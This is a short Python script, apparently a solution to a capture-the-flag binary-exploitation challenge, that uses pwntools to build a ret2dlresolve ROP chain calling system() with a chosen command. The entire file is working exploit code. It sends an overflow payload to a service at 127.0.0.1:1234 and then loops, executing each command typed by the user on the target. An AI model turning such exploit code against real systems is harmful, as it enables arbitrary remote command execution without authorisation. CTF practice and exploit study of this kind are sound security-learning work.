#!/bin/python3
from pwn import *

def exploit(val, cmd="id"):
    context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('/home/poney/Ctf/cyberthreatforce/CTF-2021/pwn/ret2dl_resolv/chall'))
    rop = ROP(context.binary)
    dlresolve = Ret2dlresolvePayload(elf, symbol=b'system', args=[cmd.encode()])
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()
    payload = fit({val+context.bytes*3: raw_rop, 150: dlresolve.payload})

    if False:
        r = process("./chall")
    else:
        r = remote("127.0.0.1",1234)
    r.sendline(payload)
    ret = r.recvall().decode()
    print(f"val={val}",ret)
    #r.interactive()
    r.close()

while True:
      exploit(100, input("cmd: "))
